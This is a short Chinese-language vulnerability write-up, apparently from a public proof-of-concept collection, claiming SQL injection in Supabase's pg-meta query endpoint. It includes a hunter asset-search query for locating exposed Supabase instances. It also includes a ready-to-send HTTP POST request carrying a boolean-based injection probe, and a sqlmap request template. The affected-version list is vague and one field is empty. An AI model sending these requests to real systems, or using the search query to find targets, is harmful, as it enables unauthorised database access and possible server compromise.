# Supabase query存在SQL注入漏洞

# 一、漏洞简介
Supabase是一个开源的Firebase替代品，提供了一系列的后端功能，让你可以更快地构建产品。它使用PostgreSQL作为数据库，支持SQL和RESTful API访问。此外，Supabase提供了完整的认证系统，支持邮箱、手机号、第三方服务等多种登录方式。Supabase 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至可获得服务器权限。

# 二、影响版本
+ Supabase

# 三、资产测绘
+ hunter`app.name="Supabase"`
+ 特征


# 四、漏洞复现
```plain
POST /api/pg-meta/default/query HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 103

{"query":"(SELECT CONCAT(CONCAT('qjpzq',(CASE WHEN (2016=2016) THEN '1' ELSE '0' END)),'qkbbq'))"}
```


sqlmap

```plain
POST /api/pg-meta/default/query HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 103

{"query":""}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsa0ghyt670h5o3q>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
